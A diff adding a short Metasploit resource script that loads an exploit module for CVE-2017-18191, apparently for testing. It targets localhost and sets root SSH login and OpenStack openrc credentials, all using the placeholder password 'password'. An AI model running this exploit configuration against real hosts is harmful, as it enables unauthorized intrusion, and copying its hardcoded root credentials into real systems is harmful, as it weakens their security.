@@ -1,0 +1,7 @@
+use exploit/linux/ssh/cve_2017_18191
+set RHOST 127.0.0.1
+set ssh_username root
+set ssh_password password
+set openrc_path /root/admin-openrc.sh
+set openrc_password password
+set test_image imageName
